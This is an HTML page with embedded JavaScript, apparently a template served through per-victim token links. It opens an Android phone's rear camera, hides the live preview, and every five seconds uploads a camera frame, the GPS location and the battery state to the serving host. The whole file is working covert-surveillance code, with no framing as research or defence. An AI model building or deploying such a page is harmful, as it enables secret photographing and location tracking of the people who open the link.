<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Android Background Capture</title>
  <style>
    body { font-family: system-ui, Arial; padding: 12px; }
    #status { white-space: pre-line; margin-top: 8px; }
    video, canvas { display: none !important; }
  </style>
</head>
<body>
  <h2>Session — Background Capture (Android)</h2>
  <p id="status">Requesting camera…</p>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <script>
    const token = "{{ token }}";
    const statusEl = document.getElementById("status");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    const INTERVAL = 5000; // capture every 5 seconds
    let stream = null;
    let timer = null;

    function log(msg){
      statusEl.textContent = msg;
      console.log(msg);
    }

    // ---- Helpers ----
    function jsonBlob(o){
      return new Blob([JSON.stringify(o)], { type: "application/json" });
    }

    function waitForVideoReady(){
      return new Promise(res => {
        if(video.videoWidth > 0) return res();
        video.onloadedmetadata = () => {
          if(video.videoWidth > 0) res();
        };
        video.oncanplay = () => {
          if(video.videoWidth > 0) res();
        };
      });
    }

    function captureFrame(){
      if(video.videoWidth === 0 || video.videoHeight === 0){
        log("Waiting for camera frame...");
        return null;
      }
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      return canvas.toDataURL("image/jpeg", 0.75);
    }

    async function getCoords(){
      return new Promise(resolve => {
        if(!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          pos => resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy
          }),
          () => resolve(null),
          { timeout: 3000 }
        );
      });
    }

    async function getBattery(){
      try{
        if(navigator.getBattery){
          const b = await navigator.getBattery();
          return { level: Math.round(b.level*100), charging: b.charging };
        }
      }catch{}
      return null;
    }

    async function upload(data){
      const url = `/upload_image/${token}`;
      const blob = jsonBlob(data);

      if(navigator.sendBeacon){
        if(navigator.sendBeacon(url, blob)) return true;
      }

      try{
        await fetch(url, {
          method: "POST",
          headers: {"Content-Type":"application/json"},
          body: JSON.stringify(data),
          keepalive: true
        });
        return true;
      }catch{}

      return false;
    }

    // ---- Main continuous capture ----
    async function captureLoop(){
      await waitForVideoReady();

      const frame = captureFrame();
      if(!frame){
        console.warn("Blank frame, retrying...");
        return; // skip this tick
      }

      const battery = await getBattery();
      const coords = await getCoords();

      const body = {
        image_b64: frame,
        battery,
        coords
      };

      const ok = await upload(body);
      log(ok ? "Uploaded image" : "Upload failed");
    }

    async function start(){
      log("Requesting camera…");

      try{
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode:"environment" },
          audio: false
        });
      } catch(err){
        log("Camera denied");
        return;
      }

      video.srcObject = stream;

      await waitForVideoReady();
      log("Camera ready. Starting capture…");

      captureLoop();
      timer = setInterval(captureLoop, INTERVAL);
    }

    // stop on unload
    window.addEventListener("beforeunload", () => {
      if(stream) stream.getTracks().forEach(t => t.stop());
    });

    start();
  </script>
</body>
</html>
